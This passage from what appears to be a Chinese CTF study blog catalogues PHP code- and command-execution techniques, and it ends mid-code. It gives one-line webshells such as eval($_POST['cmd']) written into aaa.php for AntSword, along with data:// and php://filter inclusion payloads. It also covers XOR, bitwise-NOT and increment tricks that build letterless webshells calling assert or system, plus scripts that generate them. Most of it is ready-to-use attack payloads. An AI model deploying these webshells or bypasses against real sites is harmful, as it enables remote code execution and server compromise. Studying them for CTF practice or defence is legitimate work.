+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>eval()  ：结尾加分号
+</span></span><span style="display:flex;"><span>assert()   ：结尾不加分号
+</span></span><span style="display:flex;"><span>call_user_func()   :   
+</span></span><span style="display:flex;"><span>	1. &lt;?php call_user_func(&#34;assert&#34;,$_POST[&#39;cmd&#39;]); ?&gt; 
+</span></span><span style="display:flex;"><span>       //post:cmd=system(whoami) 蚁剑连接 cmd
+</span></span><span style="display:flex;"><span>    2. &lt;?php call_user_func($_POST[&#34;fun&#34;],$_POST[&#34;para&#34;])?&gt;
+</span></span><span style="display:flex;"><span>       //post:fun=assert&amp;para=phpinfo();
+</span></span><span style="display:flex;"><span>create_function():
+</span></span><span style="display:flex;"><span>array_map():
+</span></span><span style="display:flex;"><span>call_user_func_array():
+</span></span><span style="display:flex;"><span>array_filter():
+</span></span><span style="display:flex;"><span>uasort():
+</span></span><span style="display:flex;"><span>preg_replace():
+</span></span></code></pre></div><p><a href="https://blog.csdn.net/weixin_39934520/article/details/109231480">PHP中常见的命令执行函数与代码执行函数_红烧兔纸的博客-CSDN博客</a></p>
+<p><a href="https://blog.csdn.net/weixin_43376075/article/details/105189017">eval函数和system函数的区别——代码执行漏洞和命令执行漏洞_php命令执行函数eval和system区别_美豆阿的博客-CSDN博客</a></p>
+<h5 id="命令执行函数">命令执行函数<a hidden class="anchor" aria-hidden="true" href="#命令执行函数">#</a></h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">system</span>()<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">passthru</span>()<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">exec</span>()<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pcntl_exec</span>()<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">shell_exec</span>()<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">popen</span>()<span style="color:#f92672">/</span><span style="color:#a6e22e">proc_popen</span>()<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span>(<span style="color:#e6db74">`ls`</span>)<span style="color:#f92672">:</span>
+</span></span></code></pre></div><h5 id="具体函数">具体函数<a hidden class="anchor" aria-hidden="true" href="#具体函数">#</a></h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">cat</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">tac</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">more</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">nl</span>
+</span></span></code></pre></div><h5 id="代码执行函数被ban">代码执行函数被ban<a hidden class="anchor" aria-hidden="true" href="#代码执行函数被ban">#</a></h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span><span style="color:#a6e22e">反字节符</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span>(<span style="color:#e6db74">`ls`</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2.</span><span style="color:#a6e22e">参数＋eval</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">eval</span>($_GET[<span style="color:#ae81ff">1</span>];<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#a6e22e">phpinfo</span>());
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">eval</span>($_GET[<span style="color:#ae81ff">1</span>];<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#39;ls&#39;</span>));<span style="color:#75715e">//这样只会识别到前面的 这是又传了一个参数，所以不会被检查
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3.</span><span style="color:#a6e22e">参数</span><span style="color:#f92672">+</span><span style="color:#66d9ef">include</span> <span style="color:#a6e22e">（这个没有分号‘；’）</span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span>$_GET[<span style="color:#ae81ff">1</span>]<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">&amp;1=php://filter/read=convert.base64-encode/resource=flag.php
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">//其中的?&gt;用来绕过分号，因为?&gt;默认给你偷偷加了一个分号
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">4.写入木马
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">file_put_contents(&#34;aaa.php&#34;,%20%27&lt;?php%20eval($_POST[&#34;cmd&#34;]);%20?&gt;%27);)
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    //将后面的代码写入aaa.php中 访问aaa.php 确认写入，蚁剑连接
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> 5、6都需要一步一步去看这来：   
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">//print_t(scandir(pos(localeconv())));可以看到当前目录
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">//print_r(scandir(getcwd()));也可以  getcwd()函数返回当前工作目录
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">5.使用pos(localeconv)来获取小数点
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">show_source(next(array_reverse(scandir(pos(localeconv())))));
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">//localeconv可以返回包含小数点的一个数组，用pos取数组中的第一个元素———小数点， 用scandir结合可以扫当前目录。
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">//然后re数组 取下一个数组元素 就是flag.php
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">//getcwd()函数返回当前的工作目录
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">6.
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    print(get_defined_vars());
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">eval(array_pop(next(get_defined_vars())));
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">//get_defined_vars()返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户自定义的变量。
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">//array_pop()函数 删除数组中的最后一个元素并返回其值
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">7.通配符 直接匹配flag.php输出
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">code=?&gt;&lt;?=`/???/??? ????.???`
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">8.过滤了函数：
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">code=?&gt;&lt;?=`ls`;
+</span></span></span></code></pre></div><h5 id="web38">web38<a hidden class="anchor" aria-hidden="true" href="#web38">#</a></h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> <span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//flag in flag.php
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
+</span></span><span style="display:flex;"><span>    $c <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag/i&#34;</span>, $c)){    <span style="color:#75715e">//过滤了flag函数
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">include</span>($c);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> $flag;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>}<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>这里需要用伪协议绕过  但不能用filter 因为filter协议不加密输入的东西  只把输出的东西加密</p>
+<p>使用方法为 data://text/plain;base64,内容  ：要写的命令用base64编码放入内容 <code>&lt;?php system('cat flag.php');?&gt;</code></p>
+<p>data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</p>
+<h3 id="无参rce">无参RCE<a hidden class="anchor" aria-hidden="true" href="#无参rce">#</a></h3>
+<p>参考链接</p>
+<p><a href="https://xz.aliyun.com/t/8107#toc-10">无字母数字webshell总结 - 先知社区 (aliyun.com)</a></p>
+<h5 id="0或--">0.或（ | ）<a hidden class="anchor" aria-hidden="true" href="#0或--">#</a></h5>
+<h5 id="1-异或--">1. 异或（ ^ ）<a hidden class="anchor" aria-hidden="true" href="#1-异或--">#</a></h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">c</span><span style="color:#f92672">=</span>(<span style="color:#e6db74">&#34;%13%19%13%14%05%0d&#34;</span><span style="color:#f92672">|</span><span style="color:#e6db74">&#34;%60%60%60%60%60%60&#34;</span>)(<span style="color:#e6db74">&#34;%03%01%14%00%06%0c%01%00&#34;</span><span style="color:#f92672">|</span><span style="color:#e6db74">&#34;%60%60%60%20%60%60%60%2a&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat fla*&#34;</span>)
+</span></span></code></pre></div><p><strong>代码</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/(\/|[A-Za-z]+)/&#34;</span>,$code)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;漏,你不能这样&#34;</span>);
+</span></span></code></pre></div><p><strong>异或解析</strong></p>
+<p>在PHP中，两个变量进行异或时，先会将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完，又将结果从二进制转换成了ASCII值，再将ASCII值转换成字符串。</p>
+<p><strong>异或脚本</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>str <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;~!@#$%^&amp;*()_+&lt;&gt;?:,.;-[]</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">`\/&#34;</span>
+</span></span><span style="display:flex;"><span>needstr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;T&#34;</span>  <span style="color:#75715e"># 输入想要异或的字符串</span>
+</span></span><span style="display:flex;"><span>dictin <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> range(len(needstr)):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(str)):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(str)):
+</span></span><span style="display:flex;"><span>            a <span style="color:#f92672">=</span> ord(str[i]) <span style="color:#f92672">^</span> ord(str[j])
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> needstr[c] <span style="color:#f92672">==</span> chr(a):
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#39;(&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;&#39;</span> <span style="color:#f92672">+</span> str[i] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;^&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;&#39;</span> <span style="color:#f92672">+</span> str[j] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;)&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;is&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> chr(a))
+</span></span><span style="display:flex;"><span>                dictin[c] <span style="color:#f92672">=</span> chr(a)
+</span></span></code></pre></div><p><strong>高级版  可控</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$shell <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;a&#34;</span>;
+</span></span><span style="display:flex;"><span>$result1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>$result2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span>($num<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$num<span style="color:#f92672">&lt;=</span><span style="color:#a6e22e">strlen</span>($shell);$num<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>($x<span style="color:#f92672">=</span><span style="color:#ae81ff">33</span>;$x<span style="color:#f92672">&lt;=</span><span style="color:#ae81ff">126</span>;$x<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">judge</span>(<span style="color:#a6e22e">chr</span>($x)))
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span>($y<span style="color:#f92672">=</span><span style="color:#ae81ff">33</span>;$y<span style="color:#f92672">&lt;=</span><span style="color:#ae81ff">126</span>;$y<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">judge</span>(<span style="color:#a6e22e">chr</span>($y)))
+</span></span><span style="display:flex;"><span>                {
+</span></span><span style="display:flex;"><span>                    $f <span style="color:#f92672">=</span> <span style="color:#a6e22e">chr</span>($x)<span style="color:#f92672">^</span><span style="color:#a6e22e">chr</span>($y);
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span>($f <span style="color:#f92672">==</span> $shell[$num])
+</span></span><span style="display:flex;"><span>                    {
+</span></span><span style="display:flex;"><span>                        $result1 <span style="color:#f92672">.=</span> <span style="color:#a6e22e">chr</span>($x);
+</span></span><span style="display:flex;"><span>                        $result2 <span style="color:#f92672">.=</span> <span style="color:#a6e22e">chr</span>($y);
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span> <span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> $result1;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> $result2;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">judge</span>($c)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/[a-z0-9]/is&#39;</span>,$c))
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;!((%)(&#34;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#34;@[[@[</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>;   <span style="color:#75715e">//构造出assert
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$__ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;!+/((&#34;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#34;~{`{|&#34;</span>;   <span style="color:#75715e">//构造出_POST
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$___ <span style="color:#f92672">=</span> $$__;   <span style="color:#75715e">//$___ = $_POST
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$_($___[<span style="color:#a6e22e">_</span>]);   <span style="color:#75715e">//assert($_POST[_]);
+</span></span></span></code></pre></div><p>如果payload中有一些特殊字符，需要url编码</p>
+<p><strong>GET型构造</strong></p>
+<p>相当于传了两个参数 第一个是_   第二个是__</p>
+<p>payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">code</span><span style="color:#f92672">=</span>$_<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#34;$&#34;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#34;{&#34;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#34;{&#34;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#34;&lt;&#34;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#34;{&#34;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#34;&gt;&#34;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#34;}&#34;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#34;)&#34;</span>);${$_}[<span style="color:#a6e22e">_</span>](${$_}[<span style="color:#a6e22e">__</span>]);<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">_</span><span style="color:#f92672">=</span><span style="color:#a6e22e">system</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">__</span><span style="color:#f92672">=</span><span style="color:#a6e22e">ls</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">让_GET</span><span style="color:#f92672">=</span>$_; ${$_}[<span style="color:#a6e22e">_</span>] <span style="color:#f92672">=</span> $_GET[<span style="color:#a6e22e">_</span>] <span style="color:#a6e22e">传参</span> <span style="color:#a6e22e">参数名是_</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#a6e22e">ls</span>);<span style="color:#f92672">====</span>${$_}[<span style="color:#a6e22e">_</span>](${$_}[<span style="color:#a6e22e">__</span>]);
+</span></span></code></pre></div><p><strong>POST型构造</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">assert</span>($_POST[<span style="color:#a6e22e">_</span>]);
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$_<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#39;%01&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;`&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;%13&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;`&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;%13&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;`&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;%05&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;`&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;%12&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;`&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;%14&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;`&#39;</span>); <span style="color:#75715e">// $_=&#39;assert&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$__<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;_&#39;</span><span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;%0D&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;%2F&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;`&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;%0E&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;%09&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>); <span style="color:#75715e">// $__=&#39;_POST&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$___<span style="color:#f92672">=</span>$$__;
+</span></span><span style="display:flex;"><span>$_($___[<span style="color:#a6e22e">_</span>]); <span style="color:#75715e">// assert($_POST[_]);
+</span></span></span></code></pre></div><p>payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$_<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#39;%01&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;`&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;%13&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;`&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;%13&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;`&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;%05&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;`&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;%12&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;`&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;%14&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;`&#39;</span>);$__<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;_&#39;</span><span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;%0D&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;%2F&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;`&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;%0E&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;%09&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>);$___<span style="color:#f92672">=</span>$$__;$_($___[<span style="color:#a6e22e">_</span>]);
+</span></span></code></pre></div><p><img loading="lazy" src="E:%5cblog%5cmyblog%5ccontent%5cposts%5cweb%5c%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%5c1.png" alt=""  />
+</p>
+<h5 id="2取反--">2.取反（ ~ ）<a hidden class="anchor" aria-hidden="true" href="#2取反--">#</a></h5>
+<p><strong>情况：</strong></p>
+<p>如果过滤了 ^ 但没过滤  ~</p>
+<p><strong>取反脚本</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>s <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;input&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(s)):
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;%&#39;</span><span style="color:#f92672">+</span>str(hex((<span style="color:#ae81ff">255</span>)<span style="color:#f92672">-</span>ord(s[i]))[<span style="color:#ae81ff">2</span>:]),end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+</span></span></code></pre></div><p>system    -&gt;   %8c%86%8c%8b%9a%92</p>
+<p>ls    -&gt;   %93%8c%df%d0</p>
+<p>合起来是  <code>?wllm=~(~%8C%86%8C%8B%9A%92)(~%93%8c%df%d0);</code></p>
+<h5 id="3自增自减">3.自增自减<a hidden class="anchor" aria-hidden="true" href="#3自增自减">#</a></h5>
+<p>原理：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">++</span> <span style="color:#f92672">==&gt;</span> <span style="color:#e6db74">&#34;B&#34;</span>
+</span></span></code></pre></div><p>只要得到ASCII的一个值就可以得到任何字符</p>
+<p>php中如何得到A</p>
+<p>当强制连接字符串和数组的时候 数组就会别转换成字符串 其值为 Array 取第一个就为A</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$_<span style="color:#f92672">=</span>[]<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&#39;</span>;   <span style="color:#75715e">//得到&#34;Array&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$___ <span style="color:#f92672">=</span> $_[$__];   <span style="color:#75715e">//得到&#34;A&#34;，$__没有定义，默认为False也即0，此时$___=&#34;A&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$__ <span style="color:#f92672">=</span> $___;   <span style="color:#75715e">//$__=&#34;A&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$_ <span style="color:#f92672">=</span> $___;   <span style="color:#75715e">//$_=&#34;A&#34;
